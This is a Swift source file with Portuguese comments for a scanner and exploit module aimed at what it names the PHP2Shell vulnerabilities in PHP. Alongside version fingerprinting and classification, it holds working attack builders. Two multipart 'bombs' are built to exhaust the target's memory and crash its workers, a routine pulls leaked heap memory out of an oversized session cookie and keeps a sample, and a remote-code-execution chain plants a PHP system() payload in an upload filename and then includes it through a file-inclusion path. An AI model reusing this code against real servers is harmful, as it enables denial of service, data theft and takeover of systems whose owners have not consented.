import Foundation

// MARK: - PHP2Shell (CVE-2026-109618 / CVE-2026-109619) — lógica pura
//
// Dois defeitos críticos de segurança de memória no *core* do PHP
// (5.4.0 → 8.5.11): um fatal error/OOM mal limpo deixa estado global
// velho, que o próximo request do mesmo worker consome — vazamento de
// memória estilo Heartbleed e RCE pré-auth via session.upload_progress.
// Corrigido em 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 (21/10/2026).
//
// Este arquivo só tem lógica pura (versões, fingerprint de headers,
// builders multipart, classificação de sinais, payload RCE), testável
// sem rede. A I/O de sockets mora no serviço `PhpProbe` do alvo de app
// e reaproveita estes builders/classificadores. Referências:
// ikow/php2shell-poc (MIT) e o blog do Wiz Research (21/10/2026).

// MARK: - Versão PHP

public struct PhpVersion: Hashable, Sendable, Comparable {
    public let major: Int
    public let minor: Int
    public let patch: Int?   // nem todo header anuncia o patch

    public init(major: Int, minor: Int, patch: Int? = nil) {
        self.major = major
        self.minor = minor
        self.patch = patch
    }

    /// "8.0" / "8.0.30" — o primeiro número pontilhado no texto.
    public init?(_ text: String) {
        guard let re = try? NSRegularExpression(pattern: #"(\d{1,2})\.(\d{1,2})(?:\.(\d{1,4}))?"#),
              let m = re.firstMatch(in: text, range: NSRange(text.startIndex..., in: text)),
              let r1 = Range(m.range(at: 1), in: text),
              let r2 = Range(m.range(at: 2), in: text),
              let major = Int(text[r1]),
              let minor = Int(text[r2]) else { return nil }
        let patch = m.range(at: 3).location != NSNotFound
            ? Range(m.range(at: 3), in: text).flatMap { Int(text[$0]) }
            : nil
        self.init(major: major, minor: minor, patch: patch)
    }

    /// Para exibição: "8.0.30" ou "8.1".
    public var text: String {
        if let p = patch { return "\(major).\(minor).\(p)" }
        return "\(major).\(minor)"
    }

    public static func < (l: PhpVersion, r: PhpVersion) -> Bool {
        (l.major, l.minor, l.patch ?? 0) < (r.major, r.minor, r.patch ?? 0)
    }
}

// MARK: - Advisory / classificação de vulnerabilidade

public enum PhpAdvisory {
    /// Versão mínima corrigida de cada ramo (release de 21/10/2026).
    public static let patchedFloors: [PhpVersion] = [
        PhpVersion(major: 8, minor: 2, patch: 35),
        PhpVersion(major: 8, minor: 3, patch: 36),
        PhpVersion(major: 8, minor: 4, patch: 27),
        PhpVersion(major: 8, minor: 5, patch: 12),
    ]
    /// Primeira versão coberta pelo advisory.
    public static let firstAffected = PhpVersion(major: 5, minor: 4)

    public static func classify(_ v: PhpVersion) -> PhpVulnerability {
        guard v >= firstAffected else { return .unlisted(v) }  // anterior ao escopo
        if v.major > 8 { return .unlisted(v) }                 // pós-advisory, sem dado
        if let floor = patchedFloors.first(where: { $0.major == v.major && $0.minor == v.minor }),
           v >= floor {
            return .patched(v)
        }
        // Ramos EOL (5.4–8.1) não receberam correção nesta onda → todos vulneráveis.
        return .vulnerable(v)
    }
}

public enum PhpVulnerability: Hashable, Sendable {
    case vulnerable(PhpVersion)
    case patched(PhpVersion)
    /// Versão fora do escopo do advisory (ex.: 9.x, ou 4.x).
    case unlisted(PhpVersion)

    public var isVulnerable: Bool {
        if case .vulnerable = self { return true }
        return false
    }
}

// MARK: - Fingerprint passivo (headers de resposta)

/// O que os headers da resposta revelam sobre o PHP do servidor.
/// Ordem de confiança: X-PHP-Version > Server (só se citar PHP) >
/// X-Powered-By (só se começar com PHP).
public struct PhpFingerprint: Equatable, Hashable, Sendable {
    public let version: PhpVersion
    public let source: String   // nome do header que revelou

    public init?(headers: [String: String]) {
        let lowered = Dictionary(uniqueKeysWithValues: headers.map { ($0.key.lowercased(), $0.value) })

        if let v = lowered["x-php-version"], let ver = Self.firstVersion(in: v) {
            self.version = ver; self.source = "X-PHP-Version"; return
        }
        if let s = lowered["server"],
           let p = s.range(of: "php/", options: .caseInsensitive),
           let ver = Self.firstVersion(in: String(s[p.upperBound...])) {
            self.version = ver; self.source = "Server"; return
        }
        if let rawPb = lowered["x-powered-by"] {
            let pb = rawPb.trimmingCharacters(in: .whitespaces).lowercased()
            if let t = pb.range(of: "^php", options: .regularExpression),
               let ver = Self.firstVersion(in: String(pb[t.upperBound...])) {
                self.version = ver; self.source = "X-Powered-By"; return
            }
        }
        return nil
    }

    public var vulnerability: PhpVulnerability { PhpAdvisory.classify(version) }

    /// Primeiro \d{1,2}.\d{1,2}(.\d{1,4})? — para headers como "8.1 (cli)".
    private static func firstVersion(in text: String) -> PhpVersion? {
        PhpVersion(text)
    }
}

// MARK: - Builders multipart (espelham o PoC ikow/php2shell-poc)

public enum Php2ShellMultipart {
    /// Campo do body que ativa o handler rfc1867 de upload-progress.
    public static let uploadProgressField = "PHP_SESSION_UPLOAD_PROGRESS"

    /// Upload-base: fixação de sessão (PHPSESSID no body, contorna
    /// use_only_cookies) + campo de progress + arquivo com `filename`.
    /// É assim que o PoC planta código PHP no arquivo de sessão.
    public static func upload(boundary: String = "PASTORAL",
                              sid: String,
                              filename: String) -> Data {
        let escName = filename.replacingOccurrences(of: "\"", with: "\\\"")
        let body = "--\(boundary)\r\n"
            + "Content-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n\(sid)\r\n"
            + "--\(boundary)\r\n"
            + "Content-Disposition: form-data; name=\"\(uploadProgressField)\"\r\n\r\nx\r\n"
            + "--\(boundary)\r\n"
            + "Content-Disposition: form-data; name=\"f\"; filename=\"\(escName)\"\r\n"
            + "\r\nZ\r\n"
            + "--\(boundary)--\r\n"
        return Data(body.utf8)
    }

    /// Estratégia 2 (PoC): bombardeio de headers — um part com N headers
    /// customizados de tamanho S. PHP reprime cada um internamente
    /// (ampliação ~3–5× sobre o tamanho no fio) até estourar memory_limit.
    public static func oomHeaderBomb(boundary: String,
                                     headerCount: Int,
                                     headerSize: Int,
                                     pad: Character = "A") -> Data {
        var part = "--\(boundary)\r\n"
        part += "Content-Disposition: form-data; name=\"f\"; filename=\"a\"\r\n"
        let padLine = String(repeating: String(pad), count: headerSize)
        part.reserveCapacity(headerCount * (headerSize + 24) + 64)
        for i in 0..<headerCount {
            part += "X-Pad-\(i): \(padLine)\r\n"
        }
        part += "\r\nZ\r\n--\(boundary)--\r\n"
        return Data(part.utf8)
    }

    /// Estratégia 3 (PoC): `width` file-controls vazios com nomes
    /// aninhados até `depth` níveis — PHP cria arrays aninhados para
    /// cada um (fio pequeno, alocação interna grande).
    public static func oomNestedBomb(boundary: String,
                                     depth: Int,
                                     width: Int) -> Data {
        var parts: [String] = []
        parts.reserveCapacity(width)
        for i in 0..<width {
            var name = "f"
            for d in 0..<depth { name += "[\(d)]" }
            name += "[\(i)]"
            parts.append("--\(boundary)\r\n"
                + "Content-Disposition: form-data; name=\"\(name)\"; filename=\"\"\r\n"
                + "Content-Type: application/octet-stream\r\n"
                + "\r\n")
        }
        let body = parts.joined() + "--\(boundary)--\r\n"
        return Data(body.utf8)
    }
}

/// Intensidade do gatilho de OOM — controla o tamanho no fio antes de
/// tentar estourar o memory_limit do alvo.
public enum PhpOOMIntensity: String, CaseIterable, Sendable {
    case low      // ~68 KB  — mais gentil com servidor em produção
    case medium   // ~520 KB — padrão
    case high     // ~2.6 MB — valores do PoC

    /// (número de headers, tamanho de cada) para a header-bomb.
    public var headerBomb: (count: Int, size: Int) {
        switch self {
        case .low: return (250, 250)
        case .medium: return (1_000, 500)
        case .high: return (5_000, 500)
        }
    }
    /// (profundidade, largura) para a nested-bomb.
    public var nestedBomb: (depth: Int, width: Int) {
        switch self {
        case .low: return (6, 50)
        case .medium: return (8, 150)
        case .high: return (10, 500)
        }
    }

    public var label: String {
        switch self {
        case .low: return "Baixa"
        case .medium: return "Média"
        case .high: return "Alta"
        }
    }
}

// MARK: - Classificação dos sinais de probe

/// O que uma resposta crua significa para o probe.
public enum ProbeSignal: Equatable, Hashable, Sendable {
    case unreachable      // nem conexão TCP
    case crashed          // conexão fechada sem resposta HTTP (worker caiu)
    case oom(Int)         // 5xx — provável OOM bailout
    case normal(Int)      // qualquer outro status

    /// Sinal positivo de condição exploração (OOM/crash do worker).
    public var positive: Bool {
        switch self {
        case .crashed, .oom: return true
        case .unreachable, .normal: return false
        }
    }

    public var summary: String {
        switch self {
        case .unreachable: return "sem conexão TCP"
        case .crashed: return "conexão cortada sem resposta (worker provavelmente caiu)"
        case .oom(let s): return "HTTP \(s) — provável OOM bailout"
        case .normal(let s): return "HTTP \(s) (sem sinal de OOM)"
        }
    }
}

public enum Php2ShellProbeLogic {
    /// Classifica a resposta crua de um passo do probe. `nil` = não
    /// houve conexão; vazia = o alvo fechou sem responder nada.
    public static func classify(rawResponse: Data?) -> ProbeSignal {
        guard let raw = rawResponse else { return .unreachable }
        if raw.isEmpty { return .crashed }
        if let parsed = HTTPResponseParser.parse(raw) {
            if (500..<600).contains(parsed.status) { return .oom(parsed.status) }
            return .normal(parsed.status)
        }
        return .crashed   // bytes mas sem head HTTP válido
    }

    /// O valor cru (URL-decoded) do PHPSESSID retornado na resposta.
    public static func sessionIdValue(in rawResponse: Data?) -> String? {
        guard let raw = rawResponse,
              let parsed = HTTPResponseParser.parse(raw),
              let cookie = parsed.headers.first(where: { $0.key.lowercased() == "set-cookie" })?.value,
              let eq = cookie.range(of: "PHPSESSID=") else { return nil }
        let value = String(cookie[eq.upperBound...] .prefix { $0 != ";" && $0 != " " })
        guard !value.isEmpty else { return nil }
        // O advisory descreve a heap reclaimada URL-encoded no cookie.
        return value.removingPercentEncoding ?? value
    }

    /// Vazamento de memória (Heartbleed-style do advisory): o Set-Cookie
    /// traz um PHPSESSID absurdamente longo contendo a heap reclaimada.
    /// SID legítimo tem ≤ ~32 chars; acima do limiar → devolve o tamanho.
    public static func disclosureBytes(in rawResponse: Data?, threshold: Int = 64) -> Int? {
        guard let v = sessionIdValue(in: rawResponse), v.count > threshold else { return nil }
        return v.count
    }

    /// Verdadeiro se a resposta ecoou nosso SID fixado — prova que o
    /// handler de upload-progress rodou (upload_progress ativo).
    public static func echoedSession(id rawResponse: Data?, sid: String) -> Bool {
        guard let raw = rawResponse,
              let parsed = HTTPResponseParser.parse(raw),
              let cookie = parsed.headers.first(where: { $0.key.lowercased() == "set-cookie" })?.value
        else { return false }
        return cookie.contains("PHPSESSID=\(sid)")
    }
}

// MARK: - Cadeia A de RCE (injeção de filename + LFI)

public enum Php2ShellRCE {
    public static let startMarker = "___PASTORAL_START___"
    public static let endMarker = "___PASTORAL_END___"

    /// Código plantado no filename do upload — termina cru no arquivo de
    /// sessão e roda quando o sink LFI faz include dele. Aspas simples do
    /// comando são escapadas no estilo shell (`'` → `'\''`).
    public static func plantCode(command: String) -> String {
        let safe = command.replacingOccurrences(of: "'", with: "'\\''")
        return "<?php echo '\(startMarker)'; system('\(safe)'); echo '\(endMarker)';?>"
    }

    /// Saída do comando entre os marcadores, ou nil se não executou.
    public static func output(in body: String) -> String? {
        guard let s = body.range(of: startMarker),
              let e = body.range(of: endMarker),
              e.lowerBound > s.upperBound else { return nil }
        return String(body[s.upperBound..<e.lowerBound])
            .trimmingCharacters(in: .whitespacesAndNewlines)
    }

    /// URL do sink LFI apontando para o sess_<sid> plantado.
    /// `base` já pode vir terminado em `param=` (ex.: "/vuln.php?page=");
    /// senão adiciona `?page=`.
    public static func lfiPath(base: String, sessionFile: String) -> String {
        let encoded = sessionFile.addingPercentEncoding(
            withAllowedCharacters: Self.lfiAllowed) ?? sessionFile
        if base.hasSuffix("=") { return base + encoded }
        let sep = base.contains("?") ? "&" : "?"
        return "\(base)\(sep)page=\(encoded)"
    }

    /// Slashes ficam literais (o include() precisa enxergar o caminho).
    private static var lfiAllowed: CharacterSet {
        var cs = CharacterSet.alphanumerics
        cs.insert(charactersIn: ":_-./")
        return cs
    }
}

// MARK: - Relatório do probe

public struct PhpProbeReport: Hashable, Sendable {
    public let timestamp: Date
    public let host: String
    public let port: Int
    public let path: String
    /// GET de referência: o alvo responde e, se anunciar, a versão PHP.
    public let baseline: ProbeSignal
    /// Resposta ao multipart header-bomb (estratégia 2 do PoC).
    public let oomHeaders: ProbeSignal
    /// Resposta ao multipart nested-bomb (estratégia 3 do PoC).
    public let oomNested: ProbeSignal
    /// Versão anunciada nos headers, quando havia.
    public let fingerprint: PhpFingerprint?
    /// Tamanho do PHPSESSID anômalo retornado (memória vazada), em bytes.
    public let disclosureBytes: Int?
    /// Amostra (≤ 4 KB) dos bytes vazados, já URL-decoded — vai para a
    /// Colheita quando o probe confirma o vazamento.
    public let disclosureSample: String?
    /// Nosso SID fixado voltou no Set-Cookie (upload_progress ativo).
    public let sessionCookieEchoed: Bool

    public init(timestamp: Date = .now,
                host: String,
                port: Int,
                path: String,
                baseline: ProbeSignal,
                oomHeaders: ProbeSignal,
                oomNested: ProbeSignal,
                fingerprint: PhpFingerprint?,
                disclosureBytes: Int? = nil,
                disclosureSample: String? = nil,
                sessionCookieEchoed: Bool = false) {
        self.timestamp = timestamp
        self.host = host
        self.port = port
        self.path = path
        self.baseline = baseline
        self.oomHeaders = oomHeaders
        self.oomNested = oomNested
        self.fingerprint = fingerprint
        self.disclosureBytes = disclosureBytes
        self.disclosureSample = disclosureSample
        self.sessionCookieEchoed = sessionCookieEchoed
    }

    public var vulnerability: PhpVulnerability? {
        fingerprint.map { PhpAdvisory.classify($0.version) }
    }

    /// Confirmação comportamental (independe de versão anunciada).
    public var confirmed: Bool { oomPositive || disclosureBytes != nil }
    public var oomPositive: Bool { oomHeaders.positive || oomNested.positive }

    /// Veredito final em pt-BR, em ordem de força do sinal.
    public var summary: String {
        let signals: String = {
            var parts: [String] = []
            if oomHeaders.positive { parts.append("worker caiu/OOM na header-bomb") }
            else if oomNested.positive { parts.append("worker caiu/OOM na nested-bomb") }
            if let d = disclosureBytes { parts.append("PHPSESSID com \(d) chars — memória vazada") }
            if parts.isEmpty { parts.append("nenhum sinal ativo") }
            return parts.joined(separator: "; ")
        }()

        if baseline == .unreachable {
            return "Alvo inacessível — sem conexão TCP em \(host):\(port)."
        }
        switch vulnerability {
        case .patched(let v):
            return "PHP \(v.text) — corrigido nesta onda (8.2.35/8.3.36/8.4.27/8.5.12); sinais: \(signals)."
        case .vulnerable(let v):
            if confirmed {
                return "VULNERÁVEL — PHP \(v.text) com \(signals). RCE pré-auth plausível (cadeia A ainda exige um sink LFI)."
            }
            return "PHP \(v.text) é vulnerável por versão, mas o gatilho não disparou — tente intensidade maior."
        case .unlisted(let v):
            return "PHP \(v.text) — versão fora do escopo do advisory; sinais: \(signals)."
        case .none:
            if confirmed {
                return "VULNERÁVEL por comportamento: \(signals) — versão não anunciada pelos headers."
            }
            return "Sem sinal claro de PHP2Shell: \(signals)."
        }
    }

    /// Linhas detalhadas para o log/UI, passo a passo.
    public var detailLines: [String] {
        let sessao = sessionCookieEchoed
            ? "PHPSESSID fixado via body (upload_progress ativo)"
            : "sem eco de PHPSESSID"
        let versao = fingerprint.map { "\($0.version.text) (header \($0.source))" } ?? "não anunciada"
        var lines = [
            "GET \(path): \(baseline.summary)",
            "OOM (header-bomb): \(oomHeaders.summary)",
            "OOM (nested-bomb): \(oomNested.summary)",
            "sessão: \(sessao)",
            "versão: \(versao)",
        ]
        if let d = disclosureBytes {
            lines.append("vazamento: PHPSESSID anômalo de \(d) chars (normal ≤ ~32)")
        }
        return lines
    }
}
